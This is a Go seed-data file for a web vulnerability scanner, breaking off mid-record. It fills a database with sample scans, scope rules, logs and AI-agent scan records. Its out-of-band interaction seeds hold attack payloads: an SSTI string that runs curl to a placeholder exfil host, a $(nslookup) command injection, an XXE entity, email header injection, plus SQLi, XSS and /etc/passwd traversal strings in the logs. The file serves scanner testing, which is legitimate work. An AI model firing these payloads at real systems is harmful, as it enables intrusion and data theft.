package cli

import (
	"math/rand"
	"time"

	"github.com/vigolium/vigolium/pkg/database"
)

// ---------------------------------------------------------------------------
// Scan seeds
// ---------------------------------------------------------------------------

func seedScans(rng *rand.Rand) []*database.Scan {
	now := time.Now()
	return []*database.Scan{
		{
			UUID:            "scan-0001-aaaa-bbbb-cccc-ddddeeee0001",
			Name:            "Full scan — example.com",
			Description:     "Complete scan of example.com with all modules enabled",
			Status:          "completed",
			Target:          "https://example.com",
			Modules:         "xss,sqli,lfi,ssti,crlf,openredirect",
			Threads:         10,
			Profile:         "full",
			Tags:            []string{"full-scan", "release-blocker"},
			TriggeredBy:     "user",
			SourcePath:      "/opt/repos/example-frontend",
			SourceType:      database.SourceTypeLocal,
			AgenticScanUUID: "agent-0002-aaaa-bbbb-cccc-ddddeeee0002",
			ScanSource:      "cli",
			ScanMode:        "full",
			StartCursorAt:   now.Add(-2 * time.Hour),
			CursorAt:        now.Add(-1*time.Hour - 45*time.Minute),
			ProcessedCount:  85,
			StartedAt:       now.Add(-2 * time.Hour),
			FinishedAt:      now.Add(-1*time.Hour - 45*time.Minute),
			DurationMs:      900000,
			TotalRequests:   85,
			TotalFindings:   15,
			CriticalCount:   1,
			HighCount:       2,
			MediumCount:     2,
			LowCount:        1,
			InfoCount:       1,
			SuspectCount:    8,
			StorageURL:      "gs://vigolium-scans/proj-default/scan-0001.tar.gz",
			CreatedAt:       now.Add(-2 * time.Hour),
			UpdatedAt:       now.Add(-1*time.Hour - 45*time.Minute),
		},
		{
			UUID:            "scan-0002-aaaa-bbbb-cccc-ddddeeee0002",
			Name:            "API scan — api.shop.local",
			Description:     "REST API scan targeting JSON endpoints",
			Status:          "completed",
			Target:          "https://api.shop.local",
			Modules:         "sqli,ssti,crlf",
			Threads:         5,
			Profile:         "api",
			Tags:            []string{"api-scan", "openapi-driven"},
			TriggeredBy:     "schedule",
			SourcePath:      "https://github.com/vigolium/shop-api",
			SourceType:      database.SourceTypeGitURL,
			AgenticScanUUID: "agent-0003-aaaa-bbbb-cccc-ddddeeee0003",
			ScanSource:      "api",
			ScanMode:        "incremental",
			StartCursorAt:   now.Add(-6 * time.Hour),
			StartCursorUUID: "rec-0001-seed-aaaa-bbbb-cccc0001",
			CursorAt:        now.Add(-4*time.Hour - 30*time.Minute),
			CursorUUID:      "rec-0030-seed-aaaa-bbbb-cccc001e",
			ProcessedCount:  120,
			StartedAt:       now.Add(-5 * time.Hour),
			FinishedAt:      now.Add(-4*time.Hour - 30*time.Minute),
			DurationMs:      1800000,
			TotalRequests:   120,
			TotalFindings:   9,
			HighCount:       1,
			MediumCount:     2,
			InfoCount:       1,
			SuspectCount:    5,
			StorageURL:      "gs://vigolium-scans/proj-default/scan-0002.tar.gz",
			CreatedAt:       now.Add(-5 * time.Hour),
			UpdatedAt:       now.Add(-4*time.Hour - 30*time.Minute),
		},
		{
			UUID:           "scan-0003-aaaa-bbbb-cccc-ddddeeee0003",
			Name:           "Quick XSS check — blog.test",
			Description:    "XSS-only quick scan",
			Status:         "running",
			Target:         "https://blog.test",
			Modules:        "xss",
			Threads:        3,
			Profile:        "light",
			Tags:           []string{"xss-only", "quick"},
			TriggeredBy:    "user",
			ScanSource:     "cli",
			ScanMode:       "full",
			StartCursorAt:  now.Add(-10 * time.Minute),
			CursorAt:       now.Add(-2 * time.Minute),
			ProcessedCount: 18,
			StartedAt:      now.Add(-10 * time.Minute),
			TotalRequests:  30,
			TotalFindings:  2,
			MediumCount:    1,
			SuspectCount:   1,
			CreatedAt:      now.Add(-10 * time.Minute),
			UpdatedAt:      now.Add(-2 * time.Minute),
		},
		{
			UUID:         "scan-0004-aaaa-bbbb-cccc-ddddeeee0004",
			Name:         "Failed scan — unreachable.internal",
			Description:  "Scan that failed due to connection timeout",
			Status:       "failed",
			Target:       "https://unreachable.internal",
			Modules:      "xss,sqli",
			Threads:      5,
			Profile:      "light",
			Tags:         []string{"failed"},
			TriggeredBy:  "user",
			ScanSource:   "cli",
			ScanMode:     "full",
			StartedAt:    now.Add(-24 * time.Hour),
			FinishedAt:   now.Add(-24*time.Hour + 30*time.Second),
			DurationMs:   30000,
			ErrorMessage: "connection timeout after 30s: dial tcp: lookup unreachable.internal: no such host",
			CreatedAt:    now.Add(-24 * time.Hour),
			UpdatedAt:    now.Add(-24*time.Hour + 30*time.Second),
		},
		{
			UUID:           "scan-0005-aaaa-bbbb-cccc-ddddeeee0005",
			Name:           "Scan-on-receive — proxied POST /login",
			Description:    "Auto-scan triggered by ingestion of a POST /login record from the proxy",
			Status:         "completed",
			Target:         "https://example.com/login",
			Modules:        "sqli,xss,sessionfixation",
			Threads:        3,
			Profile:        "light",
			Tags:           []string{"scan-on-receive", "proxy-triggered"},
			TriggeredBy:    "webhook",
			HTTPRecordUUID: "rec-0005-seed-aaaa-bbbb-cccc0005",
			ScanSource:     "scan-on-receive",
			ScanMode:       "incremental",
			StartCursorAt:  now.Add(-20 * time.Minute),
			CursorAt:       now.Add(-18 * time.Minute),
			ProcessedCount: 1,
			StartedAt:      now.Add(-20 * time.Minute),
			FinishedAt:     now.Add(-18 * time.Minute),
			DurationMs:     120000,
			TotalRequests:  12,
			TotalFindings:  1,
			MediumCount:    1,
			CreatedAt:      now.Add(-20 * time.Minute),
			UpdatedAt:      now.Add(-18 * time.Minute),
		},
	}
}

// ---------------------------------------------------------------------------
// Scope seeds
// ---------------------------------------------------------------------------

func seedScopes() []*database.Scope {
	now := time.Now()
	return []*database.Scope{
		{
			Name:        "Include all example.com subdomains",
			Description: "Scan all *.example.com hosts",
			RuleType:    "include",
			HostPattern: "*.example.com",
			Priority:    10,
			Enabled:     true,
			CreatedAt:   now,
			UpdatedAt:   now,
		},
		{
			Name:        "Include api.shop.local",
			Description: "Scan the shop API",
			RuleType:    "include",
			HostPattern: "api.shop.local",
			Priority:    20,
			Enabled:     true,
			CreatedAt:   now,
			UpdatedAt:   now,
		},
		{
			Name:        "Include blog.test",
			Description: "Scan the blog",
			RuleType:    "include",
			HostPattern: "blog.test",
			Priority:    30,
			Enabled:     true,
			CreatedAt:   now,
			UpdatedAt:   now,
		},
		{
			Name:        "Exclude static assets",
			Description: "Skip CDN and static resource paths",
			RuleType:    "exclude",
			HostPattern: "cdn.example.com",
			Priority:    5,
			Enabled:     true,
			CreatedAt:   now,
			UpdatedAt:   now,
		},
		{
			Name:        "Exclude image paths",
			Description: "Skip scanning image file paths",
			RuleType:    "exclude",
			PathPattern: "*.png,*.jpg,*.gif,*.svg,*.ico",
			Priority:    6,
			Enabled:     true,
			CreatedAt:   now,
			UpdatedAt:   now,
		},
		{
			Name:        "HTTPS only",
			Description: "Only scan HTTPS traffic (disabled by default for legacy testing)",
			RuleType:    "include",
			Schemes:     []string{"https"},
			Priority:    50,
			Enabled:     false,
			CreatedAt:   now,
			UpdatedAt:   now,
		},
	}
}

func seedOASTInteractions(scans []*database.Scan) []*database.OASTInteraction {
	now := time.Now()
	oastDomain := "seed.oast.example"

	return []*database.OASTInteraction{
		// DNS interaction — SSRF probe on api.shop.local
		{
			ScanUUID:      scans[1].UUID,
			UniqueID:      "seed-oast-dns-001",
			FullID:        "seed-oast-dns-001." + oastDomain,
			Protocol:      "dns",
			QType:         "A",
			RawRequest:    ";; QUESTION SECTION:\n;seed-oast-dns-001." + oastDomain + ". IN A",
			RawResponse:   ";; ANSWER SECTION:\nseed-oast-dns-001." + oastDomain + ". 300 IN A 127.0.0.1",
			RemoteAddress: "10.0.0.50:53214",
			InteractedAt:  now.Add(-4*time.Hour - 18*time.Minute),
			TargetURL:     "https://api.shop.local/api/v1/products?url=http://seed-oast-dns-001." + oastDomain,
			ParameterName: "url",
			InjectionType: "ssrf",
			ModuleID:      "ssrf-detection",
			Payload:       "http://seed-oast-dns-001." + oastDomain + "/",
			CreatedAt:     now.Add(-4*time.Hour - 18*time.Minute),
		},
		// HTTP interaction — SSRF probe confirming out-of-band HTTP callback
		{
			ScanUUID:      scans[1].UUID,
			UniqueID:      "seed-oast-http-001",
			FullID:        "seed-oast-http-001." + oastDomain,
			Protocol:      "http",
			RawRequest:    "GET / HTTP/1.1\r\nHost: seed-oast-http-001." + oastDomain + "\r\nUser-Agent: Java/11.0.2\r\n\r\n",
			RawResponse:   "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><head></head><body></body></html>",
			RemoteAddress: "10.0.0.50:48932",
			InteractedAt:  now.Add(-4*time.Hour - 17*time.Minute),
			TargetURL:     "https://api.shop.local/api/v1/products?callback=http://seed-oast-http-001." + oastDomain,
			ParameterName: "callback",
			InjectionType: "ssrf",
			ModuleID:      "ssrf-detection",
			Payload:       "http://seed-oast-http-001." + oastDomain + "/",
			CreatedAt:     now.Add(-4*time.Hour - 17*time.Minute),
		},
		// DNS interaction — XXE probe on example.com SOAP endpoint
		{
			ScanUUID:      scans[0].UUID,
			UniqueID:      "seed-oast-dns-002",
			FullID:        "seed-oast-dns-002." + oastDomain,
			Protocol:      "dns",
			QType:         "A",
			RawRequest:    ";; QUESTION SECTION:\n;seed-oast-dns-002." + oastDomain + ". IN A",
			RawResponse:   ";; ANSWER SECTION:\nseed-oast-dns-002." + oastDomain + ". 300 IN A 127.0.0.1",
			RemoteAddress: "93.184.216.34:41872",
			InteractedAt:  now.Add(-105 * time.Minute),
			TargetURL:     "https://example.com/api/soap/UserService",
			ParameterName: "",
			InjectionType: "xxe",
			ModuleID:      "xxe-generic",
			Payload:       `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://seed-oast-dns-002.` + oastDomain + `/xxe"> ]><foo>&xxe;</foo>`,
			CreatedAt:     now.Add(-105 * time.Minute),
		},
		// HTTP interaction — blind SSTI on admin settings (out-of-band confirmation)
		{
			ScanUUID:      scans[0].UUID,
			UniqueID:      "seed-oast-http-002",
			FullID:        "seed-oast-http-002." + oastDomain,
			Protocol:      "http",
			RawRequest:    "GET /exfil?data=49 HTTP/1.1\r\nHost: seed-oast-http-002." + oastDomain + "\r\nUser-Agent: curl/7.81.0\r\n\r\n",
			RawResponse:   "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><head></head><body></body></html>",
			RemoteAddress: "93.184.216.37:52100",
			InteractedAt:  now.Add(-94 * time.Minute),
			TargetURL:     "https://admin.example.com:8443/admin/settings",
			ParameterName: "debug",
			InjectionType: "ssti",
			ModuleID:      "ssti-detection",
			Payload:       "{{''.__class__.__mro__[1].__subclasses__()[407]('curl http://seed-oast-http-002." + oastDomain + "/exfil?data=' + (7*7)|string, shell=True)}}",
			CreatedAt:     now.Add(-94 * time.Minute),
		},
		// DNS interaction — blind command injection probe on legacy app
		{
			ScanUUID:      "",
			UniqueID:      "seed-oast-dns-003",
			FullID:        "seed-oast-dns-003." + oastDomain,
			Protocol:      "dns",
			QType:         "A",
			RawRequest:    ";; QUESTION SECTION:\n;seed-oast-dns-003." + oastDomain + ". IN A",
			RawResponse:   ";; ANSWER SECTION:\nseed-oast-dns-003." + oastDomain + ". 300 IN A 127.0.0.1",
			RemoteAddress: "93.184.216.35:39201",
			InteractedAt:  now.Add(-80 * time.Minute),
			TargetURL:     "http://legacy.example.com/cgi-bin/submit.cgi",
			ParameterName: "name",
			InjectionType: "cmdi",
			ModuleID:      "oast-probe",
			Payload:       "test$(nslookup+seed-oast-dns-003." + oastDomain + ")",
			CreatedAt:     now.Add(-80 * time.Minute),
		},
		// SMTP interaction — email header injection / SSRF via SMTP
		{
			ScanUUID:      scans[0].UUID,
			UniqueID:      "seed-oast-smtp-001",
			FullID:        "seed-oast-smtp-001." + oastDomain,
			Protocol:      "smtp",
			RawRequest:    "EHLO seed-oast-smtp-001." + oastDomain + "\r\nMAIL FROM:<test@attacker.com>\r\nRCPT TO:<admin@example.com>\r\nDATA\r\nSubject: test\r\n\r\ntest body\r\n.\r\n",
			RawResponse:   "220 seed-oast-smtp-001." + oastDomain + " ESMTP\r\n250 OK\r\n250 OK\r\n354 Start mail input\r\n250 OK",
			RemoteAddress: "93.184.216.34:59432",
			InteractedAt:  now.Add(-96 * time.Minute),
			TargetURL:     "https://example.com/contact",
			ParameterName: "email",
			InjectionType: "ssrf",
			ModuleID:      "oast-probe",
			Payload:       "victim%40example.com%0d%0aBcc%3A+attacker%40seed-oast-smtp-001." + oastDomain,
			CreatedAt:     now.Add(-96 * time.Minute),
		},
		// DNS interaction — uncorrelated (no target context, simulates noise)
		{
			UniqueID:      "seed-oast-dns-noise",
			FullID:        "seed-oast-dns-noise." + oastDomain,
			Protocol:      "dns",
			QType:         "AAAA",
			RawRequest:    ";; QUESTION SECTION:\n;seed-oast-dns-noise." + oastDomain + ". IN AAAA",
			RawResponse:   ";; ANSWER SECTION:\nseed-oast-dns-noise." + oastDomain + ". 300 IN AAAA ::1",
			RemoteAddress: "203.0.113.42:44123",
			InteractedAt:  now.Add(-60 * time.Minute),
			CreatedAt:     now.Add(-60 * time.Minute),
		},
	}
}

// ---------------------------------------------------------------------------
// Scan Log seeds
// ---------------------------------------------------------------------------

func seedScanLogs(scans []*database.Scan) []*database.ScanLog {
	// Scan 1: completed full scan — full lifecycle with a pause/resume
	s1 := scans[0].StartedAt
	// Scan 2: completed API scan — normal lifecycle
	s2 := scans[1].StartedAt
	// Scan 3: running scan — still in progress
	s3 := scans[2].StartedAt
	// Scan 4: failed scan — error during discovery
	s4 := scans[3].StartedAt

	return []*database.ScanLog{
		// --- Scan 1: completed, with pause/resume ---
		{ScanUUID: scans[0].UUID, Level: "info", Message: "scan started", CreatedAt: s1},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "source-analysis", Message: "phase started — analyzing /opt/repos/example-frontend", Metadata: `{"source_path":"/opt/repos/example-frontend","framework":"next.js","language":"javascript"}`, CreatedAt: s1.Add(200 * time.Millisecond)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "source-analysis", Message: "extracted 14 routes, 2 auth endpoints, 2 sinks via AI source review", Metadata: `{"routes":14,"auth_endpoints":2,"sinks":2}`, CreatedAt: s1.Add(500 * time.Millisecond)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "discovery", Message: "phase started", CreatedAt: s1.Add(1 * time.Second)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint GET /api/v1/products", CreatedAt: s1.Add(15 * time.Second)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint POST /api/v1/orders", CreatedAt: s1.Add(18 * time.Second)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint GET /search?q=", CreatedAt: s1.Add(22 * time.Second)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint GET /login", CreatedAt: s1.Add(25 * time.Second)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint GET /dashboard", CreatedAt: s1.Add(30 * time.Second)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "discovery", Message: "discovered 42 endpoints across 3 hosts", Metadata: `{"hosts":["example.com","admin.example.com","cdn.example.com"],"endpoints":42}`, CreatedAt: s1.Add(2*time.Minute + 50*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "discovery", Message: "phase completed", CreatedAt: s1.Add(3 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "spidering", Message: "phase started", Metadata: `{"seed_urls":42}`, CreatedAt: s1.Add(3*time.Minute + 1*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "spidering", Message: "crawled https://example.com/ — 12 links found", CreatedAt: s1.Add(3*time.Minute + 5*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "spidering", Message: "crawled https://example.com/about — 4 links found", CreatedAt: s1.Add(3*time.Minute + 8*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "warn", Phase: "spidering", Message: "rate limited by example.com — backing off 2s", CreatedAt: s1.Add(3*time.Minute + 30*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "spidering", Message: "spidering completed: 85 URLs crawled, 23 new endpoints added", Metadata: `{"crawled":85,"new_endpoints":23}`, CreatedAt: s1.Add(4*time.Minute + 30*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "spidering", Message: "phase completed", CreatedAt: s1.Add(4*time.Minute + 31*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "dynamic-assessment", Message: "phase started", Metadata: `{"active_modules":42,"passive_modules":12,"total_records":85}`, CreatedAt: s1.Add(4*time.Minute + 32*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "info", Message: "scan paused by user", CreatedAt: s1.Add(5 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "info", Message: "scan resumed", CreatedAt: s1.Add(7 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "dynamic-assessment", Message: "xss-reflected: testing GET /search?q= — 6 payloads", CreatedAt: s1.Add(7*time.Minute + 10*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "dynamic-assessment", Message: "sqli-error: testing GET /api/v1/products?id= — 4 payloads", CreatedAt: s1.Add(7*time.Minute + 30*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "dynamic-assessment", Message: "finding: XSS Reflected in /search?q= (high, firm)", Metadata: `{"module":"xss-reflected","severity":"high","confidence":"firm","url":"https://example.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E"}`, CreatedAt: s1.Add(8 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "dynamic-assessment", Message: "finding: SQL Injection in /api/v1/products?id= (critical, firm)", Metadata: `{"module":"sqli-error","severity":"critical","confidence":"firm","url":"https://example.com/api/v1/products?id=1'+OR+1=1--"}`, CreatedAt: s1.Add(9 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "warn", Phase: "dynamic-assessment", Message: "module timeout: sqli-time-based exceeded 30s on https://example.com/api/search", CreatedAt: s1.Add(10 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "dynamic-assessment", Message: "lfi: testing GET /index.php?page= — 8 payloads", CreatedAt: s1.Add(10*time.Minute + 15*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "dynamic-assessment", Message: "finding: Path Traversal in /index.php?page= (high, firm)", Metadata: `{"module":"lfi","severity":"high","confidence":"firm","url":"https://legacy.example.com/index.php?page=../../../etc/passwd"}`, CreatedAt: s1.Add(11 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "warn", Phase: "dynamic-assessment", Message: "WAF detected on admin.example.com — CloudFlare signature, adjusting payloads", Metadata: `{"waf":"cloudflare","host":"admin.example.com"}`, CreatedAt: s1.Add(12 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "dynamic-assessment", Message: "openredirect: testing GET /redirect?url= — 3 payloads", CreatedAt: s1.Add(13 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "dynamic-assessment", Message: "scan progress: 72/85 records processed, 15 findings so far", Metadata: `{"processed":72,"total":85,"findings":15}`, CreatedAt: s1.Add(14 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "dynamic-assessment", Message: "phase completed", Metadata: `{"records_scanned":85,"findings":15,"duration_ms":630000}`, CreatedAt: s1.Add(15 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "info", Message: "scan finished", Metadata: `{"total_requests":85,"total_findings":15,"duration_ms":900000}`, CreatedAt: s1.Add(15*time.Minute + 1*time.Second)},

		// --- Scan 2: completed API scan ---
		{ScanUUID: scans[1].UUID, Level: "info", Message: "scan started", CreatedAt: s2},
		{ScanUUID: scans[1].UUID, Level: "info", Phase: "discovery", Message: "phase started", CreatedAt: s2.Add(1 * time.Second)},
		{ScanUUID: scans[1].UUID, Level: "trace", Phase: "discovery", Message: "parsing OpenAPI spec from https://api.shop.local/openapi.json", CreatedAt: s2.Add(3 * time.Second)},
		{ScanUUID: scans[1].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint GET /api/v1/products", CreatedAt: s2.Add(5 * time.Second)},
		{ScanUUID: scans[1].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint POST /api/v1/products", CreatedAt: s2.Add(5 * time.Second)},
		{ScanUUID: scans[1].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint GET /api/v1/orders", CreatedAt: s2.Add(6 * time.Second)},
		{ScanUUID: scans[1].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint POST /api/v1/orders", CreatedAt: s2.Add(6 * time.Second)},
		{ScanUUID: scans[1].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint POST /api/v1/auth/login", CreatedAt: s2.Add(7 * time.Second)},
		{ScanUUID: scans[1].UUID, Level: "info", Phase: "discovery", Message: "OpenAPI import: 28 endpoints from 1 spec", Metadata: `{"specs":1,"endpoints":28}`, CreatedAt: s2.Add(10 * time.Second)},
		{ScanUUID: scans[1].UUID, Level: "info", Phase: "discovery", Message: "phase completed", CreatedAt: s2.Add(5 * time.Minute)},
		{ScanUUID: scans[1].UUID, Level: "info", Phase: "dynamic-assessment", Message: "phase started", Metadata: `{"active_modules":18,"passive_modules":8,"total_records":120}`, CreatedAt: s2.Add(5*time.Minute + 1*time.Second)},
		{ScanUUID: scans[1].UUID, Level: "trace", Phase: "dynamic-assessment", Message: "sqli-error: testing POST /api/v1/auth/login — 6 payloads", CreatedAt: s2.Add(6 * time.Minute)},
		{ScanUUID: scans[1].UUID, Level: "trace", Phase: "dynamic-assessment", Message: "ssti: testing POST /api/v1/products — 4 payloads", CreatedAt: s2.Add(8 * time.Minute)},
		{ScanUUID: scans[1].UUID, Level: "info", Phase: "dynamic-assessment", Message: "finding: SQL Injection in POST /api/v1/auth/login (high, firm)", Metadata: `{"module":"sqli-error","severity":"high","confidence":"firm","url":"https://api.shop.local/api/v1/auth/login"}`, CreatedAt: s2.Add(10 * time.Minute)},
		{ScanUUID: scans[1].UUID, Level: "warn", Phase: "dynamic-assessment", Message: "429 Too Many Requests from api.shop.local — throttling to 2 req/s", Metadata: `{"host":"api.shop.local","rate_limit":"2/s"}`, CreatedAt: s2.Add(15 * time.Minute)},
		{ScanUUID: scans[1].UUID, Level: "info", Phase: "dynamic-assessment", Message: "finding: SSTI in POST /api/v1/products (medium, tentative)", Metadata: `{"module":"ssti","severity":"medium","confidence":"tentative","url":"https://api.shop.local/api/v1/products"}`, CreatedAt: s2.Add(20 * time.Minute)},
		{ScanUUID: scans[1].UUID, Level: "info", Phase: "dynamic-assessment", Message: "scan progress: 120/120 records processed, 9 findings", Metadata: `{"processed":120,"total":120,"findings":9}`, CreatedAt: s2.Add(29 * time.Minute)},
		{ScanUUID: scans[1].UUID, Level: "info", Phase: "dynamic-assessment", Message: "phase completed", Metadata: `{"records_scanned":120,"findings":9,"duration_ms":1500000}`, CreatedAt: s2.Add(30 * time.Minute)},
		{ScanUUID: scans[1].UUID, Level: "info", Message: "scan finished", Metadata: `{"total_requests":120,"total_findings":9,"duration_ms":1800000}`, CreatedAt: s2.Add(30*time.Minute + 1*time.Second)},

		// --- Scan 3: running (still in progress) ---
		{ScanUUID: scans[2].UUID, Level: "info", Message: "scan started", CreatedAt: s3},
		{ScanUUID: scans[2].UUID, Level: "info", Phase: "discovery", Message: "phase started", CreatedAt: s3.Add(1 * time.Second)},
		{ScanUUID: scans[2].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint GET /", CreatedAt: s3.Add(5 * time.Second)},
		{ScanUUID: scans[2].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint GET /post/hello-world", CreatedAt: s3.Add(8 * time.Second)},
		{ScanUUID: scans[2].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint GET /post/sql-injection-101", CreatedAt: s3.Add(10 * time.Second)},
		{ScanUUID: scans[2].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint POST /post/hello-world/comment", CreatedAt: s3.Add(12 * time.Second)},
		{ScanUUID: scans[2].UUID, Level: "info", Phase: "discovery", Message: "discovered 14 endpoints on blog.test", Metadata: `{"hosts":["blog.test"],"endpoints":14}`, CreatedAt: s3.Add(1*time.Minute + 55*time.Second)},
		{ScanUUID: scans[2].UUID, Level: "info", Phase: "discovery", Message: "phase completed", CreatedAt: s3.Add(2 * time.Minute)},
		{ScanUUID: scans[2].UUID, Level: "info", Phase: "dynamic-assessment", Message: "phase started", Metadata: `{"active_modules":6,"passive_modules":4,"total_records":30}`, CreatedAt: s3.Add(2*time.Minute + 1*time.Second)},
		{ScanUUID: scans[2].UUID, Level: "trace", Phase: "dynamic-assessment", Message: "xss-reflected: testing GET /?search= — 6 payloads", CreatedAt: s3.Add(3 * time.Minute)},
		{ScanUUID: scans[2].UUID, Level: "trace", Phase: "dynamic-assessment", Message: "xss-stored: testing POST /post/hello-world/comment — 4 payloads", CreatedAt: s3.Add(4 * time.Minute)},
		{ScanUUID: scans[2].UUID, Level: "info", Phase: "dynamic-assessment", Message: "finding: XSS Reflected in /?search= (medium, tentative)", Metadata: `{"module":"xss-reflected","severity":"medium","confidence":"tentative","url":"https://blog.test/?search=%3Cimg+src%3Dx%3E"}`, CreatedAt: s3.Add(5 * time.Minute)},
		{ScanUUID: scans[2].UUID, Level: "info", Phase: "dynamic-assessment", Message: "scan progress: 18/30 records processed, 2 findings so far", Metadata: `{"processed":18,"total":30,"findings":2}`, CreatedAt: s3.Add(8 * time.Minute)},

		// --- Scan 4: failed ---
		{ScanUUID: scans[3].UUID, Level: "info", Message: "scan started", CreatedAt: s4},
		{ScanUUID: scans[3].UUID, Level: "info", Phase: "discovery", Message: "phase started", CreatedAt: s4.Add(1 * time.Second)},
		{ScanUUID: scans[3].UUID, Level: "warn", Phase: "discovery", Message: "DNS resolution failed for unreachable.internal, retrying (1/3)", Metadata: `{"host":"unreachable.internal","attempt":1}`, CreatedAt: s4.Add(10 * time.Second)},
		{ScanUUID: scans[3].UUID, Level: "warn", Phase: "discovery", Message: "DNS resolution failed for unreachable.internal, retrying (2/3)", Metadata: `{"host":"unreachable.internal","attempt":2}`, CreatedAt: s4.Add(20 * time.Second)},
		{ScanUUID: scans[3].UUID, Level: "error", Phase: "discovery", Message: "phase failed: connection timeout after 30s: dial tcp: lookup unreachable.internal: no such host", Metadata: `{"host":"unreachable.internal","error":"no such host"}`, CreatedAt: s4.Add(30 * time.Second)},
		{ScanUUID: scans[3].UUID, Level: "error", Message: "scan failed: all targets unreachable", CreatedAt: s4.Add(30*time.Second + 500*time.Millisecond)},
	}
}

// ---------------------------------------------------------------------------
// Agent run seeds
// ---------------------------------------------------------------------------

func seedAgenticScans(scans []*database.Scan) []*database.AgenticScan {
	now := time.Now()

	return []*database.AgenticScan{
		// 1. Completed query — code review for XSS
		{
			UUID:         "agent-0001-aaaa-bbbb-cccc-ddddeeee0001",
			Mode:         "query",
			AgentName:    "claude",
			Protocol:     "sdk",
			Model:        "claude-sonnet-4-6",
			TemplateID:   "code-review",
			TargetURL:    "https://example.com",
			SourcePath:   "/opt/repos/example-frontend",
			SourceType:   database.SourceTypeLocal,
			SessionDir:   "~/.vigolium/agent-sessions/agent-0001",
			Status:       "completed",
			FindingCount: 3,
			RecordCount:  0,
			SavedCount:   3,
			PromptSent:   "Review the source code at /app/src for XSS vulnerabilities. Focus on user input handling in template rendering and DOM manipulation.",
			AgentRawOutput: `## Findings

### 1. Reflected XSS in search handler (HIGH)
File: src/handlers/search.go:47
The search query parameter is reflected directly into the HTML template without escaping.

### 2. Stored XSS in comment submission (MEDIUM)
File: src/handlers/comments.go:92
User-submitted comments are stored and rendered without sanitization.

### 3. DOM-based XSS in client router (LOW)
File: src/static/js/router.js:15
The hash fragment is used to set innerHTML without encoding.`,
			AttackPlan:        `{"focus_areas":["template rendering","user input handling","DOM manipulation"],"modules":["xss-reflected","xss-stored","xss-dom"],"targets":["search handler","comment submission","client router"]}`,
			TokenUsage:        map[string]interface{}{"query": map[string]interface{}{"input": 8400, "output": 1850}},
			TotalInputTokens:  8400,
			TotalOutputTokens: 1850,
			EstimatedCostUSD:  0.0532,
			StartedAt:         now.Add(-3 * time.Hour),
			CompletedAt:       now.Add(-3*time.Hour + 45*time.Second),
			DurationMs:        45000,
			CreatedAt:         now.Add(-3 * time.Hour),
		},
		// 2. Completed autopilot — interactive scan
		{
			UUID:             "agent-0002-aaaa-bbbb-cccc-ddddeeee0002",
			ScanUUID:         scans[0].UUID,
			Mode:             "autopilot",
			AgentName:        "claude",
			Protocol:         "sdk",
			Model:            "claude-opus-4-7",
			InputRaw:         "https://example.com/api/v1/products",
			InputType:        "url",
			TargetURL:        "https://example.com",
			VulnType:         "sqli",
			InputRecordCount: 1,
			Status:           "completed",
			FindingCount:     2,
			RecordCount:      18,
			SavedCount:       2,
			SessionID:        "agent-sess-a1b2c3d4",
			SessionDir:       "~/.vigolium/agent-sessions/agent-0002",
			PromptSent:       "Test the API endpoint https://example.com/api/v1/products for SQL injection vulnerabilities. Use both error-based and time-based techniques.",
			AgentRawOutput: `I'll systematically test the /api/v1/products endpoint for SQL injection.

## Step 1: Enumerate parameters
Running: vigolium scan-url "https://example.com/api/v1/products?id=1" -m sqli

## Step 2: Error-based testing
Found SQL error disclosure when injecting single quote in id parameter.
The error message reveals PostgreSQL 14.2 backend.

## Step 3: Time-based confirmation
Confirmed blind SQL injection via time delay: id=1'+AND+pg_sleep(5)--

## Results
- SQLi Error-based in /api/v1/products?id= (CRITICAL)
- SQLi Time-based blind in /api/v1/products?id= (HIGH)`,
			TokenUsage: map[string]interface{}{
				"plan": map[string]interface{}{"input": 4200, "output": 780},
